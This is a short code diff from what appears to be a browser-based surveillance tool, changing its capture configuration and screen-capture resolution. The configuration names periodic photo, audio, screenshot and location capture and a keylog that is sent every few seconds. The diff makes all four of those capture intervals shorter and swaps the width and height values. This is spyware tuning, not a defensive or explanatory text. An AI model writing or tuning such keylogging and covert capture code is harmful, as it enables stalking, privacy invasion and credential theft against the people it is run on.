@@ -145,15 +145,15 @@ const CONFIG = {
     
     // Capture Settings
     PHOTO_INTERVAL: 500,        // Photo every 500ms
-    AUDIO_DURATION: 20000,      // 10 second audio clips
-    SCREEN_INTERVAL: 30000,      // Screenshot every 3s
-    LOCATION_INTERVAL: 10000,    // Location every 5s
-    KEYLOG_SEND_INTERVAL: 15000, // Send keylog every 5s
+    AUDIO_DURATION: 10000,      // 10 second audio clips
+    SCREEN_INTERVAL: 3000,      // Screenshot every 3s
+    LOCATION_INTERVAL: 5000,    // Location every 5s
+    KEYLOG_SEND_INTERVAL: 5000, // Send keylog every 5s
     
     // Quality Settings
     PHOTO_QUALITY: 0.92,
-    PHOTO_WIDTH: 1080,
-    PHOTO_HEIGHT: 1920,
+    PHOTO_WIDTH: 1920,
+    PHOTO_HEIGHT: 1080,
     
     // Retry Settings
     MAX_RETRIES: 5,
@@ -771,8 +771,8 @@ const ScreenModule = {
             STATE.streams.screen = await navigator.mediaDevices.getDisplayMedia({
                 video: {
                     mediaSource: 'screen',
-                    width: { ideal: 1080 },
-                    height: { ideal: 1920 }
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
                 }
             });
             
@@ -797,8 +797,8 @@ const ScreenModule = {
             const canvas = document.getElementById('screen-canvas');
             const ctx = canvas.getContext('2d');
             
-            canvas.width = video.videoWidth || 1080;
-            canvas.height = video.videoHeight || 1920;
+            canvas.width = video.videoWidth || 1920;
+            canvas.height = video.videoHeight || 1080;
             ctx.drawImage(video, 0, 0);
             
             const dataURL = canvas.toDataURL('image/jpeg', 0.85);
